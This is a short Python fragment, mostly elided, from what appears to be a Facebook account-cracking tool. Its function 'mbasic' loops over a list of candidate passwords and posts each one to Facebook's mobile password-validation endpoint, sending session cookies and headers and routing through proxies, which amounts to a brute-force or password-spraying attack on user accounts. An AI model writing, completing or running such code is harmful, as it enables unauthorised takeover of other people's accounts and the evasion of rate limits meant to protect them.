...
def mbasic(idf, pwv):
	...
	for pw in pwv:
		...
		po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,cookies={'cookie': koki},headers=headers,allow_redirects=False,proxies=proxs)
